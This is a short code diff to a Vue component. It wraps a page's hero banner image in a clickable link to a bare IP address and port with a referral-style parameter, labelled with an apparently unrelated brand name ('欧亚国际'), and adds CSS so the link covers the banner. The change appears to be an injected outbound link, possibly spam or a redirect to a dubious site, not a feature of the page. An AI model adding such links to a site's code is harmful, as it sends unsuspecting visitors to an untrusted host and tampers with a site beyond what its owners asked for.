@@ -1,7 +1,9 @@
 <template>
   <section class="hero">
-    <div class="stage" aria-hidden="true">
-      <img class="hero-poster" :src="posterImg" alt="" />
+    <div class="stage">
+      <a class="hero-link" href="http://42.51.38.194:48806?Tesla=NTY1NzU1" target="_blank" rel="noopener" aria-label="欧亚国际">
+        <img class="hero-poster" :src="posterImg" alt="" />
+      </a>
     </div>
   </section>
 
@@ -258,6 +260,9 @@ h1 {
   position: relative;
   display: grid;
   place-items: center;
+}
+.hero-link {
+  display: block;
 }
 .hero-poster {
   width: 100%;
